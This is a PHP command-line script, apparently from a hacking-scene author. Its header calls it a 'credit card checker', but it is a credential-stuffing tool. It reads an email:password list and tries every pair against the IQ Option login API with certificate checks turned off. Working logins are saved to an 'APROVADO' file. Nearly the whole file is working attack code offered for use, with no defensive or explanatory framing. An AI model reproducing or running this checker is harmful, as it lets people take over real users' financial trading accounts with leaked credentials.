<?php
/*  ================[INFO]================
 *   AUTHOR  : @zBL4CKHATOFICIAL
 *   SCRIPT  : CREDIT CARD CHECKER
 *   GITHUB  : https://github.com/Hacker666EXE
 *   VERSION : 0.1 (CLI)
 *  ======================================
 */

// Configurações
ini_set("memory_limit", '-1');
date_default_timezone_set("America/Sao_Paulo");
define("OS", strtolower(PHP_OS));

// Cores ANSI
define('ANSI_COLOR_RESET', "\033[0m");
define('ANSI_COLOR_GREEN', "\033[32m");
define('ANSI_COLOR_RED', "\033[31m");

// Detecta se o terminal suporta cores
function supportsColors() {
    return (posix_isatty(STDOUT) || getenv('ANSICON') !== false);
}

$date = date("l, d-m-Y");

// Banner
system("clear");
echo banner();

// Função para enviar requisições HTTP
function sendRequest($url, $method = 'POST', $data = null, $headers = []) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
            $headers[] = 'Content-Type: application/json';
        }
    }
    if ($headers) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log('Curl error: ' . curl_error($ch));
        return false;
    }
    curl_close($ch);
    return $result;
}

// Função para realizar login
function login($email, $password) {
    $LOGIN_URL = "https://auth.iqoption.com/api/v2/login";
    $data = [
        "identifier" => $email,
        "password" => $password
    ];
    $headers = [
        "Accept: application/json",
        "User-Agent: Mozilla/5.0"
    ];
    $response = sendRequest($LOGIN_URL, 'POST', $data, $headers);
    return $response;
}

// Entrada da lista
enterlist:
echo "\n[+] Insira sua lista [email:pass] (ex: list.txt) >> ";
$listname = trim(fgets(STDIN));
if(empty($listname) || !file_exists($listname)) {
        echo " [!] Sua maldita lista não foi encontrada [!]".PHP_EOL;
        goto enterlist;
}
$lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));

echo "[?] Continuar ? (Y/n) >> ";
$q = trim(fgets(STDIN));
$que = strtolower($q);
if($que == 'n') exit("\n[!] VOCÊ É PREGUIÇOSO!? [!]\n\n");

// Contagem
$l = 0;
$d = 0;
$e = 0;
$u = 0;
$no = 0;
$total = count($lists);
echo "\n[+] TOTAL $total lists [+]\n\n";

// Verifica se o terminal suporta cores
$useColors = supportsColors();

// Looping
foreach ($lists as $list) {
     $no++;
     $explode = explode(":", $list);
     $email = isset($explode[0]) ? $explode[0] : '';
     $senha = isset($explode[1]) ? $explode[1] : '';

     $response = login($email, $senha);

     if ($response) {
        $responseData = json_decode($response, true);
        if (isset($responseData['code']) && $responseData['code'] === 'success') {
            $l++;
            file_put_contents("result/APROVADO.txt", $list.PHP_EOL, FILE_APPEND);
            echo "[" . ($useColors ? ANSI_COLOR_GREEN : '') . "$no/$total" . ($useColors ? ANSI_COLOR_RESET : '') . "] " . ($useColors ? ANSI_COLOR_GREEN : '') . "APROVADO" . ($useColors ? ANSI_COLOR_RESET : '') . " | $list | EMAIL CHECKER \n";
        } else {
            $d++;
            file_put_contents("result/INVÁLIDO.txt", $list.PHP_EOL, FILE_APPEND);
            echo "[" . ($useColors ? ANSI_COLOR_RED : '') . "$no/$total" . ($useColors ? ANSI_COLOR_RESET : '') . "] " . ($useColors ? ANSI_COLOR_RED : '') . "INVÁLIDO" . ($useColors ? ANSI_COLOR_RESET : '') . " | $list | EMAIL CHECKER \n";
        }
     } else {
         $e++;
         file_put_contents("result/error.txt", $list.PHP_EOL, FILE_APPEND);
         echo "[x] ERROR DE CONEXÃO [x]\n";
     }
}

// End
echo "
DATA : $date
==========[INFO]==========
  LISTA TOTAL : $total
  " . ($useColors ? ANSI_COLOR_GREEN : '') . "APROVADO : $l" . ($useColors ? ANSI_COLOR_RESET : '') . "
  " . ($useColors ? ANSI_COLOR_RED : '') . "INVÁLIDO : $d" . ($useColors ? ANSI_COLOR_RESET : '') . "
  ERROR : $e
==========================
    OBRIGADO POR USAR
";

function banner(){
    $banner = "
--------------------------------------------------
        ________              __            
 ____  / ____/ /_  ___  _____/ /_____  _____
/_  / / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/
 / /_/ /___/ / / /  __/ /__/ ,< /  __/ /    
/___/\____/_/ /_/\___/\___/_/|_|\___/_/     
                                                
--------------------------------------------------
⠀⠀⢀⣤⣶⣶⣤⣄⡀
⠀⢀⣿⣿⣿⣿⣿⣿⣿⡆   AUTHOR  : @zBL4CKHATOFICIAL
⠀⠸⣿⣿⣿⣿⣿⡟⡟⡗   VERSION : 0.1
⠀⠀⠙⠏⠯⠛⣉⢲⣧⠟   SCRIPT  : EMAIL CHECKER [EMAIL:PASS]
⠀⠀⠠⢭⣝⣾⠿⣴⣿⠇ ----------------------------------------
⠀⠀⢐⣺⡿⠁⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣶⣶⣶⣶⣶⣶⠀
⠀⠀⣚⣿⠃            ⣶⣶⣶⣶
⢀⣿⣿⣿⣷⢒⣢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣶⣶⣄⠄
⢰⣿⣿⡿⣿⣦⠬⢝⡄⠀⠀⠀⠀⠀⠀⢠⣿⠿⠿⠟⠛⠋⠁
⠠⢿⣿⣷⠺⣿⣗⠒⠜⡄⠀⠀⠀⠀⣴⠟⠁
⠀⣰⣿⣷⣍⡛⣯⣯⣙⡁⠀⠀⣠⡾⠁
⠀⠨⢽⣿⣷⢍⣛⣶⢷⣼⣠⣾⠋
⠀⠀⠘⢿⣿⣖⠬⣹⣶⣿⠟⠁
⠀⠀⠀⠚⠿⠿⡒⠨⠛⠋
⠀⠀⠀⠐⢒⣛⣷
⠀⠀⠀⢘⣻⣭⣭
⠀⠀⠀⡰⢚⣺⣿
⠀⠀⢠⣿⣿⣿⣿⣦⡄
⠀⠀⢸⡿⢿⣿⢿⡿⠃
⠀⠀⠘⡇⣸⣿⣿⣿⣆
⠀⠀⠀⠀⠸⣿⡿⠉⠁
  ⠀⠀⠀⢿⡟

";
    return $banner;
}
?>
